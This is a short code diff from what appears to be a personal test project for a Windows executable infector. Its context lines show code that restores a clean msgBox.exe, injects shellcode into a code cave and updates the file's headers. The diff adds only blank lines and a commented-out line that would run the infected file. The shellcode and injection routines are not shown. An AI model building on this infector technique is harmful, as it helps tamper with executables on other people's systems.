@@ -126,6 +126,7 @@ int main()
 {
     // Restarting the infected file to original.
     CopyFileA("C:\\Users\\User\\source\\repos\\playground\\Debug\\msgBox.exe", INFECTED_PATH, FALSE);
+
     int result = SUCCESS;
     EXE_file* infected = NULL;
     HANDLE mapping_handle = { 0 };
@@ -205,6 +206,7 @@ int main()
 
     update_infected_headers(infected, shellcode_size, codecave_address);
 
+
 end:
     if (infected != NULL)
     {
@@ -213,5 +215,8 @@ end:
     }
     if (shellcode_buffer != NULL)
         free(shellcode_buffer);
+
+    //system(INFECTED_PATH);
+    // run the infected.
     return result;
 }
